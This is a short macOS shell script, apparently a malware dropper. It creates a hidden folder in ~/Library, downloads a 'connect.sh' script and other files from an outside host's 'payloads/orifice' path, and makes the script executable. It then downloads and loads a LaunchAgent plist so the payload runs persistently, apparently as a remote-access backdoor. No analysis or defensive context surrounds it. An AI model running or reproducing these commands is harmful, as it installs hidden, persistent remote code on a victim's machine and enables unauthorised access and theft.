mkdir ~/Library/.hidden ; cd ~/Library/.hidden ; wget http://mcp.gnerd.io/payloads/orifice/connect.sh ; chmod +x connect.sh
wget http://mcp.gnerd.io/payloads/orifice/stuff.txt
mkdir ~/Library/LaunchAgents ; cd ~/Library/LaunchAgents ; wget http://mcp.gnerd.io/payloads/orifice/com.gnerdsec.orifice.plist ; chmod 600 com.gnerdsec.orifice.plist ; launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist


